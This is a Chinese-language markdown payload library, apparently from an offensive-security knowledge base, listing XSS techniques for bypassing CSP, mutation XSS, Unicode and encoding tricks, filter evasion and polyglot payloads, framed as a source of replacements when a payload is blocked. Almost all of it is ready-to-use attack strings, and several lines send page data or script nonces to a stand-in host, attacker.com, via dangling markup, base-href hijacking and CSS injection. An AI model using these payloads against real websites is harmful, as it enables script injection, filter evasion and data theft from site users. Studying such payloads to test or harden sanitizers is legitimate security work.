# XSS 绕过 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:CSP 绕过 / mXSS / Unicode XSS / 过滤器绕过 / 编码绕过 / Polyglot。任何被拦的 payload 来这里挑替代。

---

### CSP绕过  `xss-csp-bypass`
绕过内容安全策略(CSP)的XSS技术
子类：**CSP绕过** · tags: `xss` `csp` `bypass`

**前置条件：** 存在XSS漏洞；存在CSP策略但配置不当

**攻击链：**

**1. 1. 分析CSP策略**
_分析CSP配置_
```
查看HTTP响应头:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
或使用CSP Evaluator工具分析
```

**2. 2. 利用unsafe-inline**
_利用unsafe-inline配置_
```
如果CSP包含unsafe-inline:
<script>alert(1)</script>
可以直接执行内联脚本
```

**3. 3. 利用unsafe-eval**
_利用unsafe-eval配置_
```
如果CSP包含unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
可以使用eval等函数
```

**4. 4. JSONP绕过**
_利用JSONP绕过_
```
如果允许的域名有JSONP端点:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
利用JSONP回调执行代码
```

**5. 5. AngularJS绕过**
_利用AngularJS绕过CSP_
```
如果允许了AngularJS CDN:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```

**6. 6. Dangling Markup**
_利用悬挂标记窃取数据_
```
<img src='http://attacker.com/?
捕获后续HTML内容直到遇到单引号
```

**WAF/EDR 绕过变体：**

**1. JSONP端点劫持CSP**
_利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline_
```
# 寻找白名单域上的JSONP端点:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```

**2. base-uri劫持与script nonce泄露**
_利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值_
```
# base-uri未限制时:
<base href="http://attacker.com/">
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# 或通过DOM读取: document.querySelector("script[nonce]").nonce
```

---

### 突变型XSS(mXSS)  `xss-mxss`
利用浏览器解析差异导致的XSS攻击
子类：**突变型** · tags: `xss` `mxss` `mutation` `bypass`

**前置条件：** 存在HTML输出点；浏览器解析差异

**攻击链：**

**1. 1. 基础mXSS探测**
_利用noscript标签解析差异_
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**2. 2. SVG mXSS**
_SVG CDATA突变_
```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```

**3. 3. Math mXSS**
_MathML突变XSS_
```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**4. 4. DOM clobbering配合**
_利用DOM clobbering_
```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```

**WAF/EDR 绕过变体：**

**1. 嵌套标签绕过**
_SVG内脚本编码绕过_
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```

---

### Unicode XSS  `xss-unicode`
利用Unicode编码特性绕过过滤
子类：**Unicode编码** · tags: `xss` `unicode` `encoding` `bypass`

**前置条件：** 存在XSS注入点；过滤器检查关键字

**攻击链：**

**1. 1. Unicode转义**
_JavaScript Unicode转义_
```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```

**2. 2. HTML实体编码**
_HTML十进制/十六进制实体_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**3. 3. Unicode规范化攻击**
_利用Unicode规范化_
```
使用规范化等效字符:
＜script＞alert(1)＜/script＞
使用全角字符绕过
```

**4. 4. UTF-7编码**
_UTF-7编码XSS_
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
需要页面使用UTF-7编码
```

**WAF/EDR 绕过变体：**

**1. 混合编码绕过**
_混合多种编码方式_
```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```

**2. 过长UTF-8编码**
_利用服务器UTF-8解析差异_
```
<img src=x onerror=alert(1)>
使用非最短UTF-8编码形式
```

---

### XSS过滤器绕过  `xss-filter-bypass`
各种绕过XSS过滤器的技术
子类：**过滤器绕过** · tags: `xss` `filter` `bypass` `waf`

**前置条件：** 存在XSS注入点；存在过滤机制

**攻击链：**

**1. 1. 大小写混淆**
_混合大小写绕过_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```

**2. 2. 双写绕过**
_双写绕过关键字删除_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**3. 3. 注释混淆**
_使用注释混淆_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

**4. 4. 空字节截断**
_空字节截断绕过_
```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```

**5. 5. 标签属性绕过**
_利用空白字符绕过_
```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```

**6. 6. 事件处理器变体**
_使用少见的事件处理器_
```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

**WAF/EDR 绕过变体：**

**1. Data URI绕过**
_使用Data URI_
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

**2. SVG动画绕过**
_SVG动画事件_
```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

---

### XSS编码绕过  `xss-encoding`
利用各种编码技术绕过XSS过滤
子类：**编码绕过** · tags: `xss` `encoding` `bypass`

**前置条件：** 存在XSS注入点；存在编码处理

**攻击链：**

**1. 1. URL编码**
_URL编码绕过_
```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```

**2. 2. HTML实体编码**
_HTML实体编码_
```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```

**3. 3. JavaScript编码**
_JavaScript编码_
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**4. 4. CSS编码**
_CSS编码（旧版IE）_
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```

**5. 5. 混合编码**
_混合多种编码_
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码**
_双重URL编码_
```
%253Cscript%253Ealert(1)%253C/script%253E
服务器解码两次时使用
```

**2. UTF-16编码**
_UTF-16编码绕过_
```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```

---

### Polyglot XSS  `xss-polyglot`
多环境通用的XSS payload
子类：**Polyglot** · tags: `xss` `polyglot` `universal`

**前置条件：** 存在XSS注入点；不确定具体环境

**攻击链：**

**1. 1. 经典Polyglot**
_经典多环境Polyglot_
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**2. 2. 短Polyglot**
_短版本Polyglot_
```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

**3. 3. 属性注入Polyglot**
_属性值注入Polyglot_
```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

**4. 4. URL参数Polyglot**
_URL参数Polyglot_
```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

**WAF/EDR 绕过变体：**

**1. 高级Polyglot**
_简洁高效Polyglot_
```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```

---


---

← 回 [00-index.md](00-index.md) · 通用 WAF 绕过见 [`../../strategy/02-bypass-toolkit.md`](../../strategy/02-bypass-toolkit.md)
